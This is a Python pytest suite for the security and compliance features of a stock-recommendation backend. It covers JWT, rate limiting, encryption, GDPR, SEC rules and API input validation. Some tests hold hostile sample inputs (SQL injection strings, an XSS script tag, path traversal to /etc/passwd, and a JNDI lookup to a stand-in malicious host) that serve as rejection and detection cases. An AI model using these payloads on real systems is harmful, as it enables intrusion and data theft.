"""
Security and Compliance Testing Suite

This module provides comprehensive security and compliance tests for
SEC and GDPR requirements, authentication, authorization, and data protection.
"""

import pytest
import asyncio
import hashlib
import secrets
import jwt
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, AsyncMock
import re
import tempfile
import os
from cryptography.fernet import Fernet
from sqlalchemy import text
import requests_mock
import time

# Import security modules
from backend.security.jwt_manager import JWTManager
from backend.security.rate_limiter import RateLimiter, DistributedRateLimiter
from backend.security.sql_injection_prevention import SQLInjectionPrevention
from backend.security.database_security import DatabaseSecurity
from backend.security.secrets_manager import SecretsManager
from backend.utils.data_anonymization import DataAnonymizer
from backend.utils.audit_logger import AuditLogger
from backend.auth.oauth2 import OAuth2Handler
from backend.api.main import app

# Import FastAPI testing
from fastapi.testclient import TestClient
from httpx import AsyncClient


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    @pytest.fixture
    def jwt_manager(self):
        return JWTManager(secret_key="test_secret_key_12345678901234567890")
    
    @pytest.fixture
    def oauth2_handler(self):
        return OAuth2Handler(
            client_id="test_client_id",
            client_secret="test_client_secret",
            redirect_uri="http://localhost:8000/auth/callback"
        )
    
    def test_jwt_token_creation_validation(self, jwt_manager):
        """Test JWT token creation and validation"""
        
        # Test valid token creation
        payload = {
            'user_id': 12345,
            'email': 'test@example.com',
            'role': 'user',
            'permissions': ['read', 'write']
        }
        
        token = jwt_manager.create_token(payload, expires_delta=timedelta(hours=1))
        
        # Token should be a valid JWT
        assert isinstance(token, str)
        assert len(token.split('.')) == 3  # JWT has 3 parts
        
        # Test token validation
        decoded_payload = jwt_manager.validate_token(token)
        
        assert decoded_payload['user_id'] == 12345
        assert decoded_payload['email'] == 'test@example.com'
        assert decoded_payload['role'] == 'user'
        assert 'exp' in decoded_payload  # Should have expiration
        assert 'iat' in decoded_payload  # Should have issued at
    
    def test_jwt_token_expiration(self, jwt_manager):
        """Test JWT token expiration handling"""
        
        # Create short-lived token
        payload = {'user_id': 123, 'role': 'test'}
        token = jwt_manager.create_token(payload, expires_delta=timedelta(seconds=1))
        
        # Should be valid immediately
        decoded = jwt_manager.validate_token(token)
        assert decoded['user_id'] == 123
        
        # Wait for expiration
        time.sleep(2)
        
        # Should now be invalid
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt_manager.validate_token(token)
    
    def test_jwt_token_tampering_detection(self, jwt_manager):
        """Test detection of tampered JWT tokens"""
        
        payload = {'user_id': 123, 'role': 'user'}
        token = jwt_manager.create_token(payload)
        
        # Tamper with token
        token_parts = token.split('.')
        tampered_payload = token_parts[1] + 'tampered'
        tampered_token = f"{token_parts[0]}.{tampered_payload}.{token_parts[2]}"
        
        # Should detect tampering
        with pytest.raises(jwt.InvalidTokenError):
            jwt_manager.validate_token(tampered_token)
    
    def test_password_hashing_security(self):
        """Test password hashing security"""
        
        from backend.security.password_manager import PasswordManager
        
        password_manager = PasswordManager()
        
        # Test password hashing
        password = "test_password_123!@#"
        hashed = password_manager.hash_password(password)
        
        # Hash should be different from original
        assert hashed != password
        assert len(hashed) > 50  # Should be long hash
        
        # Should verify correctly
        assert password_manager.verify_password(password, hashed)
        
        # Should not verify wrong password
        assert not password_manager.verify_password("wrong_password", hashed)
        
        # Should generate different hashes for same password (salt)
        hashed2 = password_manager.hash_password(password)
        assert hashed != hashed2
        
        # But both should verify correctly
        assert password_manager.verify_password(password, hashed2)
    
    def test_oauth2_flow_security(self, oauth2_handler):
        """Test OAuth2 flow security"""
        
        # Test authorization URL generation
        state = oauth2_handler.generate_state()
        auth_url = oauth2_handler.get_authorization_url(state)
        
        # Should include required parameters
        assert 'client_id=' in auth_url
        assert 'redirect_uri=' in auth_url
        assert 'state=' in auth_url
        assert 'response_type=code' in auth_url
        
        # State should be secure random
        assert len(state) >= 32
        assert state != oauth2_handler.generate_state()  # Should be different each time
    
    def test_session_management_security(self):
        """Test session management security"""
        
        from backend.security.session_manager import SessionManager
        
        session_manager = SessionManager()
        
        # Create session
        user_id = 12345
        session_token = session_manager.create_session(user_id)
        
        # Session token should be secure
        assert len(session_token) >= 32
        assert session_token.isalnum() or '_' in session_token or '-' in session_token
        
        # Should validate correctly
        validated_user_id = session_manager.validate_session(session_token)
        assert validated_user_id == user_id
        
        # Should invalidate session
        session_manager.invalidate_session(session_token)
        
        # Should no longer validate
        invalid_user_id = session_manager.validate_session(session_token)
        assert invalid_user_id is None
    
    @pytest.mark.parametrize("role,resource,expected", [
        ('admin', 'all_stocks', True),
        ('user', 'own_portfolio', True),
        ('user', 'admin_panel', False),
        ('guest', 'public_data', True),
        ('guest', 'personal_data', False),
    ])
    def test_role_based_access_control(self, role, resource, expected):
        """Test role-based access control"""
        
        from backend.security.rbac import RoleBasedAccessControl
        
        rbac = RoleBasedAccessControl()
        
        # Define permissions
        rbac.define_role('admin', ['read:all', 'write:all', 'delete:all'])
        rbac.define_role('user', ['read:own', 'write:own'])
        rbac.define_role('guest', ['read:public'])
        
        # Define resource permissions
        rbac.define_resource('all_stocks', 'read:all')
        rbac.define_resource('own_portfolio', 'read:own')
        rbac.define_resource('admin_panel', 'write:all')
        rbac.define_resource('public_data', 'read:public')
        rbac.define_resource('personal_data', 'read:own')
        
        # Test access
        has_access = rbac.check_access(role, resource)
        assert has_access == expected


class TestRateLimitingSecurity:
    """Test rate limiting security measures"""
    
    @pytest.fixture
    def rate_limiter(self):
        return RateLimiter(
            redis_client=None,  # Use in-memory for testing
            default_limit=10,
            default_window=60
        )
    
    def test_basic_rate_limiting(self, rate_limiter):
        """Test basic rate limiting functionality"""
        
        client_id = "test_client_123"
        endpoint = "api/stocks"
        
        # Should allow requests within limit
        for i in range(10):
            allowed = rate_limiter.is_allowed(client_id, endpoint)
            assert allowed, f"Request {i+1} should be allowed"
        
        # Should block requests over limit
        blocked = rate_limiter.is_allowed(client_id, endpoint)
        assert not blocked, "Request over limit should be blocked"
    
    def test_different_clients_separate_limits(self, rate_limiter):
        """Test that different clients have separate rate limits"""
        
        client1 = "client_1"
        client2 = "client_2"
        endpoint = "api/recommendations"
        
        # Use up client1's limit
        for i in range(10):
            rate_limiter.is_allowed(client1, endpoint)
        
        # Client1 should be blocked
        assert not rate_limiter.is_allowed(client1, endpoint)
        
        # Client2 should still be allowed
        assert rate_limiter.is_allowed(client2, endpoint)
    
    def test_different_endpoints_separate_limits(self, rate_limiter):
        """Test that different endpoints have separate limits"""
        
        client_id = "test_client"
        endpoint1 = "api/stocks"
        endpoint2 = "api/analysis"
        
        # Use up endpoint1's limit
        for i in range(10):
            rate_limiter.is_allowed(client_id, endpoint1)
        
        # Endpoint1 should be blocked
        assert not rate_limiter.is_allowed(client_id, endpoint1)
        
        # Endpoint2 should still be allowed
        assert rate_limiter.is_allowed(client_id, endpoint2)
    
    def test_rate_limit_window_reset(self, rate_limiter):
        """Test that rate limit window resets correctly"""
        
        client_id = "test_client"
        endpoint = "api/test"
        
        # Use up limit
        for i in range(10):
            rate_limiter.is_allowed(client_id, endpoint)
        
        # Should be blocked
        assert not rate_limiter.is_allowed(client_id, endpoint)
        
        # Simulate window reset (in real implementation, would wait for time)
        rate_limiter._reset_window(client_id, endpoint)
        
        # Should be allowed again
        assert rate_limiter.is_allowed(client_id, endpoint)
    
    def test_distributed_rate_limiting(self):
        """Test distributed rate limiting across multiple instances"""
        
        # This would test Redis-based distributed rate limiting
        # For now, test the interface
        
        distributed_limiter = DistributedRateLimiter(
            redis_host="localhost",
            redis_port=6379
        )
        
        # Test that it has the same interface
        assert hasattr(distributed_limiter, 'is_allowed')
        assert hasattr(distributed_limiter, 'get_limit_info')
        assert hasattr(distributed_limiter, 'reset_limit')
    
    def test_adaptive_rate_limiting(self, rate_limiter):
        """Test adaptive rate limiting based on system load"""
        
        client_id = "adaptive_client"
        endpoint = "api/heavy_computation"
        
        # Simulate high system load
        rate_limiter.set_system_load(0.9)  # 90% CPU usage
        
        # Should reduce limits under high load
        original_limit = rate_limiter.get_limit(client_id, endpoint)
        adapted_limit = rate_limiter.get_adaptive_limit(client_id, endpoint)
        
        assert adapted_limit < original_limit, "Adaptive limit should be lower under high load"
        
        # Simulate normal load
        rate_limiter.set_system_load(0.3)  # 30% CPU usage
        
        # Should use normal limits under normal load
        normal_limit = rate_limiter.get_adaptive_limit(client_id, endpoint)
        assert normal_limit >= original_limit, "Should use normal limits under normal load"


class TestSQLInjectionPrevention:
    """Test SQL injection prevention measures"""
    
    @pytest.fixture
    def sql_prevention(self):
        return SQLInjectionPrevention()
    
    @pytest.mark.parametrize("malicious_input,should_detect", [
        ("'; DROP TABLE users; --", True),
        ("' UNION SELECT * FROM passwords --", True),
        ("admin'--", True),
        ("' OR 1=1 --", True),
        ("'; INSERT INTO users VALUES ('hacker', 'password'); --", True),
        ("normal_stock_ticker", False),
        ("AAPL", False),
        ("stock-with-dash", False),
        ("stock_with_underscore", False),
    ])
    def test_sql_injection_detection(self, sql_prevention, malicious_input, should_detect):
        """Test detection of SQL injection attempts"""
        
        is_malicious = sql_prevention.detect_sql_injection(malicious_input)
        
        if should_detect:
            assert is_malicious, f"Should detect SQL injection in: {malicious_input}"
        else:
            assert not is_malicious, f"Should not flag legitimate input: {malicious_input}"
    
    def test_input_sanitization(self, sql_prevention):
        """Test input sanitization"""
        
        # Test basic sanitization
        malicious_input = "'; DROP TABLE users; --"
        sanitized = sql_prevention.sanitize_input(malicious_input)
        
        # Should remove or escape dangerous characters
        assert "DROP TABLE" not in sanitized.upper()
        assert "--" not in sanitized
        
        # Test that legitimate input is preserved
        legitimate_input = "AAPL"
        sanitized_legitimate = sql_prevention.sanitize_input(legitimate_input)
        assert sanitized_legitimate == legitimate_input
    
    def test_parameterized_query_helper(self, sql_prevention):
        """Test parameterized query helpers"""
        
        # Test safe query building
        table_name = "stocks"
        columns = ["ticker", "price", "volume"]
        conditions = {"ticker": "AAPL", "active": True}
        
        query, params = sql_prevention.build_safe_query(
            table_name=table_name,
            columns=columns,
            conditions=conditions
        )
        
        # Query should use parameterized placeholders
        assert ":ticker" in query
        assert ":active" in query
        assert "AAPL" not in query  # Raw value should not be in query
        
        # Parameters should contain actual values
        assert params["ticker"] == "AAPL"
        assert params["active"] is True
    
    def test_database_user_permissions(self, sql_prevention):
        """Test database user has minimal required permissions"""
        
        # This would test actual database permissions
        # For now, test the validation logic
        
        required_permissions = [
            "SELECT on stocks table",
            "INSERT on recommendations table",
            "UPDATE on user_portfolios table"
        ]
        
        forbidden_permissions = [
            "DROP TABLE",
            "CREATE DATABASE",
            "GRANT permissions",
            "ALTER SYSTEM"
        ]
        
        for permission in required_permissions:
            assert sql_prevention.validate_permission(permission, required=True)
        
        for permission in forbidden_permissions:
            assert not sql_prevention.validate_permission(permission, required=False)


class TestDataEncryptionSecurity:
    """Test data encryption and security measures"""
    
    @pytest.fixture
    def encryption_key(self):
        return Fernet.generate_key()
    
    @pytest.fixture
    def fernet_cipher(self, encryption_key):
        return Fernet(encryption_key)
    
    def test_sensitive_data_encryption(self, fernet_cipher):
        """Test encryption of sensitive data"""
        
        # Test encrypting sensitive financial data
        sensitive_data = {
            "user_id": 12345,
            "portfolio_value": 1500000.00,
            "bank_account": "****-****-****-1234",
            "api_key": "secret_api_key_12345"
        }
        
        # Encrypt data
        plaintext = json.dumps(sensitive_data).encode()
        encrypted_data = fernet_cipher.encrypt(plaintext)
        
        # Encrypted data should be different
        assert encrypted_data != plaintext
        assert len(encrypted_data) > len(plaintext)
        
        # Should decrypt correctly
        decrypted_data = fernet_cipher.decrypt(encrypted_data)
        decrypted_dict = json.loads(decrypted_data.decode())
        
        assert decrypted_dict == sensitive_data
    
    def test_database_encryption_at_rest(self):
        """Test database encryption at rest configuration"""
        
        from backend.security.database_security import DatabaseSecurity
        
        db_security = DatabaseSecurity()
        
        # Test encryption configuration
        encryption_config = db_security.get_encryption_config()
        
        assert encryption_config['encryption_enabled'] is True
        assert 'encryption_algorithm' in encryption_config
        assert encryption_config['encryption_algorithm'] in ['AES-256', 'AES-128']
        assert 'key_rotation_enabled' in encryption_config
    
    def test_api_key_encryption(self):
        """Test API key encryption and storage"""
        
        secrets_manager = SecretsManager()
        
        # Store encrypted API key
        api_key = "sensitive_api_key_12345678901234567890"
        encrypted_key_id = secrets_manager.store_api_key("alpha_vantage", api_key)
        
        # Should return an ID, not the actual key
        assert encrypted_key_id != api_key
        assert len(encrypted_key_id) > 10
        
        # Should be able to retrieve decrypted key
        retrieved_key = secrets_manager.get_api_key("alpha_vantage")
        assert retrieved_key == api_key
    
    def test_pii_data_hashing(self):
        """Test PII data hashing for compliance"""
        
        from backend.utils.data_anonymization import DataAnonymizer
        
        anonymizer = DataAnonymizer()
        
        # Test email hashing
        email = "user@example.com"
        hashed_email = anonymizer.hash_pii(email, field_type="email")
        
        # Should be consistently hashed
        assert hashed_email == anonymizer.hash_pii(email, field_type="email")
        assert hashed_email != email
        assert "@" not in hashed_email  # Should not contain original format
        
        # Test IP address hashing
        ip_address = "192.168.1.100"
        hashed_ip = anonymizer.hash_pii(ip_address, field_type="ip_address")
        
        assert hashed_ip != ip_address
        assert "." not in hashed_ip  # Should not contain IP format
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        
        from backend.security.crypto_utils import SecureRandom
        
        secure_random = SecureRandom()
        
        # Test secure token generation
        token1 = secure_random.generate_token(32)
        token2 = secure_random.generate_token(32)
        
        assert len(token1) == 64  # 32 bytes = 64 hex chars
        assert len(token2) == 64
        assert token1 != token2  # Should be different
        
        # Test secure random integers
        random_int1 = secure_random.randint(1000, 9999)
        random_int2 = secure_random.randint(1000, 9999)
        
        assert 1000 <= random_int1 <= 9999
        assert 1000 <= random_int2 <= 9999
        # High probability they're different
        assert random_int1 != random_int2 or abs(random_int1 - random_int2) > 0


class TestGDPRCompliance:
    """Test GDPR compliance measures"""
    
    @pytest.fixture
    def data_anonymizer(self):
        return DataAnonymizer()
    
    def test_data_anonymization(self, data_anonymizer):
        """Test GDPR-compliant data anonymization"""
        
        # Test user data anonymization
        user_data = {
            "user_id": 12345,
            "email": "user@example.com",
            "name": "John Doe",
            "ip_address": "192.168.1.100",
            "phone": "+1-555-123-4567",
            "portfolio_value": 150000.00
        }
        
        anonymized_data = data_anonymizer.anonymize_user_data(user_data)
        
        # PII should be anonymized
        assert anonymized_data["email"] != user_data["email"]
        assert anonymized_data["name"] != user_data["name"]
        assert anonymized_data["ip_address"] != user_data["ip_address"]
        assert anonymized_data["phone"] != user_data["phone"]
        
        # Non-PII should be preserved or anonymized appropriately
        assert anonymized_data["user_id"] != user_data["user_id"]  # Should be pseudonymized
        
        # Financial data handling depends on requirements
        # May be preserved for legitimate business purposes
    
    def test_data_portability(self):
        """Test GDPR data portability requirements"""
        
        from backend.compliance.gdpr import GDPRDataPortability
        
        gdpr_service = GDPRDataPortability()
        
        user_id = 12345
        
        # Export user data
        exported_data = gdpr_service.export_user_data(user_id)
        
        # Should include all user data categories
        expected_categories = [
            "profile", "portfolio", "transactions", 
            "recommendations", "preferences", "audit_logs"
        ]
        
        for category in expected_categories:
            assert category in exported_data, f"Missing data category: {category}"
        
        # Data should be in machine-readable format
        assert isinstance(exported_data, dict)
        
        # Should be able to convert to standard formats
        json_export = gdpr_service.to_json(exported_data)
        csv_export = gdpr_service.to_csv(exported_data)
        
        assert isinstance(json_export, str)
        assert isinstance(csv_export, str)
    
    def test_right_to_deletion(self):
        """Test GDPR right to deletion (right to be forgotten)"""
        
        from backend.compliance.gdpr import GDPRDataDeletion
        
        gdpr_service = GDPRDataDeletion()
        
        user_id = 12345
        
        # Request data deletion
        deletion_request = gdpr_service.request_deletion(user_id)
        
        # Should return deletion request ID
        assert "request_id" in deletion_request
        assert deletion_request["status"] == "pending"
        
        # Process deletion
        result = gdpr_service.process_deletion(deletion_request["request_id"])
        
        # Should confirm deletion
        assert result["status"] == "completed"
        assert "deleted_records_count" in result
        assert result["deleted_records_count"] > 0
        
        # Should maintain audit trail (anonymized)
        audit_record = gdpr_service.get_deletion_audit(deletion_request["request_id"])
        assert audit_record is not None
        assert "deletion_date" in audit_record
        assert "records_deleted" in audit_record
    
    def test_consent_management(self):
        """Test GDPR consent management"""
        
        from backend.compliance.gdpr import ConsentManager
        
        consent_manager = ConsentManager()
        
        user_id = 12345
        
        # Record initial consent
        consent_manager.record_consent(
            user_id=user_id,
            consent_type="data_processing",
            consent_given=True,
            consent_date=datetime.now(),
            legal_basis="legitimate_interest"
        )
        
        # Check consent status
        consent_status = consent_manager.get_consent_status(user_id)
        
        assert consent_status["data_processing"] is True
        assert "consent_date" in consent_status
        
        # Update consent (user withdraws)
        consent_manager.update_consent(
            user_id=user_id,
            consent_type="data_processing",
            consent_given=False
        )
        
        # Should reflect updated consent
        updated_status = consent_manager.get_consent_status(user_id)
        assert updated_status["data_processing"] is False
        
        # Should maintain consent history
        consent_history = consent_manager.get_consent_history(user_id)
        assert len(consent_history) == 2  # Initial and update
    
    def test_data_breach_notification(self):
        """Test GDPR data breach notification requirements"""
        
        from backend.compliance.gdpr import DataBreachNotification
        
        breach_service = DataBreachNotification()
        
        # Report data breach
        breach_details = {
            "breach_type": "unauthorized_access",
            "affected_records": 1500,
            "data_categories": ["email", "portfolio_data"],
            "discovery_date": datetime.now(),
            "containment_measures": "Access revoked, passwords reset"
        }
        
        breach_id = breach_service.report_breach(breach_details)
        
        # Should generate breach report
        assert isinstance(breach_id, str)
        assert len(breach_id) > 10
        
        # Should determine if notification required (>72 hours rule)
        notification_required = breach_service.is_notification_required(breach_id)
        assert isinstance(notification_required, bool)
        
        # Should generate regulatory notification
        if notification_required:
            notification = breach_service.generate_regulatory_notification(breach_id)
            
            required_fields = [
                "breach_description", "affected_data_subjects", 
                "likely_consequences", "measures_taken"
            ]
            
            for field in required_fields:
                assert field in notification


class TestSECCompliance:
    """Test SEC compliance requirements"""
    
    def test_audit_logging(self):
        """Test SEC-compliant audit logging"""
        
        audit_logger = AuditLogger()
        
        # Test user action logging
        audit_logger.log_user_action(
            user_id=12345,
            action="portfolio_modification",
            details={
                "stock": "AAPL",
                "action": "buy",
                "shares": 100,
                "price": 150.00
            },
            ip_address="192.168.1.100",
            timestamp=datetime.now()
        )
        
        # Test system action logging
        audit_logger.log_system_action(
            action="recommendation_generation",
            details={
                "algorithm": "ml_ensemble",
                "stocks_analyzed": 6000,
                "recommendations_generated": 25
            },
            timestamp=datetime.now()
        )
        
        # Retrieve audit logs
        user_logs = audit_logger.get_user_audit_logs(user_id=12345, days=1)
        system_logs = audit_logger.get_system_audit_logs(hours=1)
        
        assert len(user_logs) >= 1
        assert len(system_logs) >= 1
        
        # Verify required audit fields
        user_log = user_logs[0]
        required_fields = [
            "timestamp", "user_id", "action", "ip_address", 
            "details", "session_id"
        ]
        
        for field in required_fields:
            assert field in user_log, f"Missing required audit field: {field}"
    
    def test_data_retention_policies(self):
        """Test SEC data retention requirements"""
        
        from backend.compliance.sec import DataRetentionManager
        
        retention_manager = DataRetentionManager()
        
        # Define retention periods (SEC requirements)
        retention_policies = {
            "trade_records": {"years": 6},
            "customer_communications": {"years": 3},
            "portfolio_statements": {"years": 3},
            "audit_logs": {"years": 7},
            "recommendation_rationale": {"years": 5}
        }
        
        for data_type, policy in retention_policies.items():
            retention_manager.set_retention_policy(data_type, policy)
        
        # Test retention compliance
        for data_type in retention_policies:
            policy = retention_manager.get_retention_policy(data_type)
            assert policy is not None
            assert "years" in policy
            
            # Test data cleanup for expired records
            expired_records = retention_manager.find_expired_records(data_type)
            if expired_records:
                cleanup_result = retention_manager.cleanup_expired_data(data_type)
                assert "records_deleted" in cleanup_result
                assert cleanup_result["records_deleted"] >= 0
    
    def test_investment_advice_documentation(self):
        """Test SEC investment advice documentation"""
        
        from backend.compliance.sec import InvestmentAdviceDocumentation
        
        doc_service = InvestmentAdviceDocumentation()
        
        # Document recommendation rationale
        recommendation_id = "rec_12345"
        rationale = {
            "stock": "AAPL",
            "recommendation": "BUY",
            "target_price": 180.00,
            "analysis_factors": [
                "strong_fundamentals",
                "positive_technical_indicators",
                "bullish_sentiment"
            ],
            "risk_factors": [
                "market_volatility",
                "sector_competition"
            ],
            "model_confidence": 0.85,
            "analyst_review": "Comprehensive analysis completed"
        }
        
        doc_result = doc_service.document_recommendation(
            recommendation_id=recommendation_id,
            rationale=rationale,
            analyst_id="analyst_001"
        )
        
        assert doc_result["status"] == "documented"
        assert "documentation_id" in doc_result
        
        # Retrieve documentation
        retrieved_doc = doc_service.get_recommendation_documentation(recommendation_id)
        
        assert retrieved_doc is not None
        assert retrieved_doc["stock"] == "AAPL"
        assert retrieved_doc["recommendation"] == "BUY"
        assert "timestamp" in retrieved_doc
        assert "analyst_id" in retrieved_doc
    
    def test_fiduciary_duty_compliance(self):
        """Test fiduciary duty compliance checks"""
        
        from backend.compliance.sec import FiduciaryDutyChecker
        
        fiduciary_checker = FiduciaryDutyChecker()
        
        # Test recommendation conflicts of interest
        recommendation = {
            "stock": "AAPL",
            "action": "BUY",
            "analyst_id": "analyst_001",
            "firm_holdings": True,  # Firm owns the stock
            "client_risk_tolerance": "moderate"
        }
        
        conflict_check = fiduciary_checker.check_conflicts_of_interest(recommendation)
        
        assert "conflicts_detected" in conflict_check
        assert "conflict_details" in conflict_check
        
        if conflict_check["conflicts_detected"]:
            assert len(conflict_check["conflict_details"]) > 0
            
            # Should require disclosure
            disclosure_required = fiduciary_checker.requires_disclosure(recommendation)
            assert disclosure_required is True
        
        # Test suitability analysis
        client_profile = {
            "risk_tolerance": "moderate",
            "investment_objective": "growth",
            "time_horizon": "long_term",
            "liquidity_needs": "low"
        }
        
        suitability_result = fiduciary_checker.analyze_suitability(
            recommendation, client_profile
        )
        
        assert "suitable" in suitability_result
        assert "suitability_score" in suitability_result
        assert 0 <= suitability_result["suitability_score"] <= 1


class TestAPISecurityEndpoints:
    """Test API endpoint security"""
    
    @pytest.fixture
    def test_client(self):
        return TestClient(app)
    
    def test_authentication_required_endpoints(self, test_client):
        """Test that protected endpoints require authentication"""
        
        protected_endpoints = [
            "/api/portfolio",
            "/api/recommendations/generate",
            "/api/admin/users",
            "/api/analysis/custom"
        ]
        
        for endpoint in protected_endpoints:
            response = test_client.get(endpoint)
            
            # Should require authentication
            assert response.status_code == 401, f"Endpoint {endpoint} should require auth"
            assert "authentication" in response.json().get("detail", "").lower()
    
    def test_api_rate_limiting_integration(self, test_client):
        """Test API rate limiting integration"""
        
        endpoint = "/api/stocks/AAPL"
        
        # Make requests up to limit
        responses = []
        for i in range(15):  # Assuming 10 request limit
            response = test_client.get(endpoint)
            responses.append(response)
        
        # Some requests should be rate limited
        status_codes = [r.status_code for r in responses]
        assert 429 in status_codes, "Rate limiting should activate"
        
        # Rate limited responses should have appropriate headers
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        for response in rate_limited_responses:
            assert "X-RateLimit-Limit" in response.headers
            assert "X-RateLimit-Remaining" in response.headers
            assert "Retry-After" in response.headers
    
    def test_input_validation_security(self, test_client):
        """Test input validation against malicious inputs"""
        
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE stocks; --",
            "../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://malicious.com/a}",  # JNDI injection
        ]
        
        for malicious_input in malicious_inputs:
            # Test in different contexts
            
            # URL parameter
            response = test_client.get(f"/api/stocks/{malicious_input}")
            assert response.status_code in [400, 404], f"Should reject malicious input: {malicious_input}"
            
            # JSON body
            response = test_client.post(
                "/api/analysis/custom",
                json={"ticker": malicious_input}
            )
            # Might be 400 (validation) or 401 (auth required)
            assert response.status_code in [400, 401], f"Should reject malicious JSON: {malicious_input}"
    
    def test_cors_security_configuration(self, test_client):
        """Test CORS security configuration"""
        
        # Test preflight request
        response = test_client.options(
            "/api/stocks",
            headers={
                "Origin": "http://malicious-site.com",
                "Access-Control-Request-Method": "GET"
            }
        )
        
        # Should have CORS headers, but should be restrictive
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            # Should not allow all origins in production
            assert allowed_origin != "*", "CORS should not allow all origins"
    
    def test_security_headers(self, test_client):
        """Test security headers are present"""
        
        response = test_client.get("/api/health")
        
        # Should have security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        for header in security_headers:
            # Not all headers may be implemented yet, but check what's there
            if header in response.headers:
                assert len(response.headers[header]) > 0


class TestVulnerabilityScanning:
    """Test for common security vulnerabilities"""
    
    def test_dependency_vulnerabilities(self):
        """Test for known vulnerabilities in dependencies"""
        
        # This would integrate with tools like safety, bandit, etc.
        # For now, test the concept
        
        from backend.security.vulnerability_scanner import DependencyScanner
        
        scanner = DependencyScanner()
        
        # Scan dependencies
        vulnerabilities = scanner.scan_dependencies()
        
        # Should return vulnerability report
        assert "scanned_packages" in vulnerabilities
        assert "vulnerabilities_found" in vulnerabilities
        assert isinstance(vulnerabilities["vulnerabilities_found"], list)
        
        # High/critical vulnerabilities should be flagged
        critical_vulns = [
            v for v in vulnerabilities["vulnerabilities_found"]
            if v["severity"] in ["high", "critical"]
        ]
        
        # Should have zero critical vulnerabilities in production
        assert len(critical_vulns) == 0, f"Critical vulnerabilities found: {critical_vulns}"
    
    def test_code_security_analysis(self):
        """Test static code security analysis"""
        
        from backend.security.code_analyzer import SecurityCodeAnalyzer
        
        analyzer = SecurityCodeAnalyzer()
        
        # Analyze code for security issues
        issues = analyzer.analyze_security_issues()
        
        # Should return analysis results
        assert "files_scanned" in issues
        assert "issues_found" in issues
        
        # Check for common security issues
        issue_types = [issue["type"] for issue in issues["issues_found"]]
        
        # Should not have critical security issues
        critical_issues = [
            "hardcoded_password",
            "sql_injection",
            "command_injection", 
            "path_traversal"
        ]
        
        for critical_issue in critical_issues:
            assert critical_issue not in issue_types, \
                f"Critical security issue found: {critical_issue}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])